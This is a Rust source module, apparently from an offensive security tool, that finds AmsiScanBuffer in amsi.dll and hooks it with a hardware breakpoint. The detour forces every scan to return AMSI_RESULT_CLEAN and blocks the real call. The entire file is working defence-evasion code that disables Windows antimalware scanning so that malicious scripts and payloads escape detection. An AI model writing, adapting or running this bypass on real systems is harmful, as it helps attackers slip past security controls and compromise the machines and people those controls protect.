//! AMSI hook installer using a hardware breakpoint detour.

pub mod errors;
use errors::AmsiError;
use hwbp::CallArgs;
use windows_sys::Win32::{
    Foundation::GetLastError,
    System::{
        Antimalware::AMSI_RESULT_CLEAN,
        Diagnostics::Debug::CONTEXT,
        LibraryLoader::{GetModuleHandleA, GetProcAddress},
    },
};
use windows_sys::s;

/// Detour function invoked when the hardware breakpoint hits `AmsiScanBuffer`.
///
/// # Safety
/// This function will be invoked in the context of the target thread's
/// execution. It works directly with raw register/context structures and the
/// `hwbp::CallArgs` helper to change parameters / block the real call.
unsafe extern "system" fn amsi_scan_buffer_detour(ctx: *mut CONTEXT) {
    unsafe {
        let mut args = CallArgs::new(ctx);
        args.set(6, AMSI_RESULT_CLEAN as usize);
        args.block_real_execution();
        args.continue_execution();
    }
}

/// Installs a hardware breakpoint detour on `AmsiScanBuffer` to always return AMSI_RESULT_CLEAN.
///
/// Returns a typed `AmsiError` on failure instead of an opaque `String`.
///
/// # Safety
/// This function calls raw Win32 APIs and installs a breakpoint which changes
/// control flow. Only call from a trusted context and ensure you understand
/// the implications of modifying another function's execution.
pub fn patch() -> Result<(), AmsiError> {
    unsafe {
        let hmodule = GetModuleHandleA(s!("amsi.dll"));
        if hmodule.is_null() {
            return Err(AmsiError::GetModuleHandleFailed(GetLastError()));
        }

        let proc_opt = GetProcAddress(hmodule as *mut _, s!("AmsiScanBuffer"));
        let proc_addr = match proc_opt {
            Some(p) => p,
            None => return Err(AmsiError::GetProcAddressFailed(GetLastError())),
        };

        hwbp::manager::install_hwbp(proc_addr as _, amsi_scan_buffer_detour as _)
            .map_err(|e| AmsiError::InstallHwBpFailed(format!("{:?}", e)))?;

        log::info!("AmsiScanBuffer [ {:X} ] is hooked", proc_addr as usize);
    }

    Ok(())
}
